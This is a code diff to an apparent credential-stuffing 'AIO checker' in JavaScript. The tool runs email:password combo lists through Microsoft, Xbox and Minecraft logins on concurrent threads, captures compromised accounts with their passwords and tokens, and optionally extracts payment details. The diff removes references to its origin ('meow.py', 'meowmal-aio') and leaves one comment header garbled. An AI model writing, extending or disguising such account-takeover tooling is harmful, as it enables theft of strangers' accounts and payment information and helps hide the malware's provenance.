@@ -1983,7 +1983,7 @@ async function handleCapture(email, password, name, capes, uuid, token, type, ja
   return c;
 }
 
-// ── checkmc (exact from meow.py) ─────────────────────────────
+// ── checkmc — Minecraft entitlement // ── checkmc (exact from meow.py) ───────────────────────────── capture flow ──────────
 
 async function checkMc(jar, email, password, token, xboxToken) {
   let acctype = null;
@@ -2032,7 +2032,7 @@ async function checkMc(jar, email, password, token, xboxToken) {
 
   const capesStr = capesList.join(", ");
 
-  // Handle capture (only if NOT Game Pass only — exact from meow.py)
+  // Handle capture (only if NOT Game Pass only)
   if (!acctype.includes("Game Pass") || acctype.includes("Normal")) {
     try {
       await handleCapture(email, password, name, capesStr, uuidStr, token, acctype, jar);
@@ -2066,7 +2066,7 @@ async function checkMc(jar, email, password, token, xboxToken) {
   return true;
 }
 
-// ── authenticate (exact from meow.py) ────────────────────────
+// ── authenticate — primary login + Xbox/MC pipeline ─────────
 
 async function authenticate(email, password) {
   let currentTry = 0;
@@ -2128,7 +2128,7 @@ async function authenticate(email, password) {
         }
       } catch {}
 
-      // Payment extraction (exact from meow.py)
+      // Payment extraction
       if (config.payment) {
         try {
           await extractPayment(jar, email, password);
@@ -2168,7 +2168,7 @@ async function authenticate(email, password) {
   return false;
 }
 
-// ── Checker (exact from meow.py — wraps pre_check + authenticate) ──
+// ── Checker — wraps pre_check + authenticate ────────────────
 
 async function Checker(combo) {
   try {
@@ -2251,7 +2251,7 @@ async function runAioCheck(combos, threads = 30, onProgress, signal) {
     concurrency: threads,
     maxRetries: 0,
     signal,
-    scope: "meowmal-aio",
+    scope: "aio-checker",
     runner: async (combo) => {
       if (signal?.aborted) return { status: "skipped", email: combo.split(":")[0] };
       return await Checker(combo);
